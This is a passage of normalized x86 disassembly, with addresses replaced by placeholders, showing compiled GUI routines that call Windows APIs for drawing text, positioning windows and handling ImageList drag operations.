add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_43c51c
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_439044
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_43c554
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43c54c
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c594
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_433cb4
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_433790
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_43c5f0
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_433d8c
test bl bl
jle r-xdata
xor eax eax
call sub_431d84
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_43c630
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d194
xor eax eax
push ebp
push sub_43c6cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d520
xor eax eax
push ebp
push sub_43c6a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c6af
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41d520
retn
sub_43c6dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43d014
mov edx 0x80ffff
mov eax esi
call sub_434d54
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41d39c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41ce64
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_43c748
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43821c
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40bb34
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4381b4
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_43c7b4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43c80a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c811
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ReleaseDC
retn
sub_43c818
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_43c8b1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_41c55c
mov eax ebx
call sub_436ec8
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_434bb4
mov eax [ ebp - 0x14 ]
call sub_404338
push eax
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c8b8
lea eax [ ebp - 0x14 ]
call sub_403e78
retn
sub_43c8c0
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_43c92c
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_43c9b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c9be
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_434bb4
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_41d2dc
mov edx eax
add edx 0x6
mov eax esi
call sub_434370
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_434bb4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_41d2f8
mov edx eax
add edx 0x4
mov eax esi
call sub_434394
sub_43c9c4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_43cb9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_434be4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_435e00
mov eax [ esi ]
call sub_45302c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_453038
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_45302c
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_453020
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_453038
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_453014
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_453020
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_453014
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_438ac4
push 0x4
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cba4
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404138
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_43fc5c
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call [ rw-data ]
sub_43cbac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43cbd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_412484
mov eax esi
call sub_436ec8
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404338
push eax
mov eax [ esi + 0x208 ]
call sub_41d4a0
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_43cc30
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_412484
call sub_42c460
call sub_42c540
test al al
jne r-xdata
call sub_42c460
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_42c89c
push esp
push 0x1
push 0xf
push 0x0
call sub_42c460
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_42c600
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_43cc9c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4393cc
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_43ccc0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_43cd18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43cdd8
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453500
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4236e8
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453500
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4236e8
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_43cde4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_441f38
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43ce44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442bac
mov eax ebx
call sub_441d64
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push esi
push 0x0
call ImageList_GetDragImage
sub_43ce70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_441d64
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_43cd18
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43ced0
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_43cde4
push 0x0
call ShowCursor
sub_43ced0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_441d64
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_43cf34
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43ccc0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43cf34
push ebx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_43cf58
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_441d64
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_43ccc0
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43cfcc
push ebx
push esi
mov esi eax
mov eax esi
call sub_441d64
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_43cf34
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_43ce2c
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43d014
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4370bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ce98
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_433790
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_43d070
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4371e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_43d0c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d194
xor eax eax
push ebp
push sub_43d15e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41d520
xor eax eax
push ebp
push sub_43d13b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4337a8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d142
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d520
retn
sub_43d170
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43d204
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_43d18c
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43d204
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_43d7fc
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_43d204
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_43d238
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43d2c8
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov edx 0x2
call sub_43d2c8
jmp r-xdata
retn
sub_43d280
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43d334
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b304
call sub_4038b4
mov edx 0x2
call sub_43d334
jmp r-xdata
retn
sub_43d2c8
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_43d6fc
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_43d334
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_43d1e8
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_43d6fc
push eax
mov eax esi
call sub_43d238
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_43d6fc
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_43d3e4
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43d1e8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_43d7fc
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_43d334
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_43d1e8
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_43d334
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_43d238
mov edx eax
add edx esi
mov eax ebx
call sub_43d724
mov edx edi
mov eax ebx
call sub_43d724
jmp r-xdata
mov eax ebx
call sub_43d584
mov eax ebx
call sub_43d7d4
mov ebx eax
test ebx ebx
jne r-xdata
sub_43d48c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403e78
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403ecc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
sub_43d4d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_403324
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_43d541
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4358a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_43d554
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_43d7d4
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_43d584
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43d334
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43d334
mov esi eax
push ebp
call sub_43d554
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d7d4
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
